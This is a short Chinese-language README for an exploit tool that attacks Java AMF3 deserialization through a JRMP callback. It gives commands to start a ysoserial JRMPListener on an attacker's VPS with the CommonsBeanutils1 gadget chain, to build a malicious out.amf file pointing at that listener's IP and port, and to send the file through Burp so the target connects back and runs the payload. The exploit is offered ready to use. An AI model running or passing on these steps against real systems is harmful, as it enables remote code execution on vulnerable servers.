# AMF_JRMP
改造一个基于jrmp的AMF反序列化利用工具 

只适用于出网的机器

将ysoserial放到服务器/vps中，先启动一个jrmp，利用链根据实际情况改
```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsBeanutils1 calc
```

然后本地运行这个AMFpoc_JRMP.jar
```bash
java -jar AMFpoc_JRMP.jar 起服务的ip 起服务的端口
```
比如这样
```bash
java -jar AMFpoc_JRMP.jar 114.114.114.114 1234
```
他会生成一个out.amf,使用burp右键选择pasted from file，选这个out.amf发送就可以触发

有关这个反序列化的介绍，请看这个大佬的介绍
https://www.mi1k7ea.com/2019/12/07/Java-AMF3反序列化漏洞/
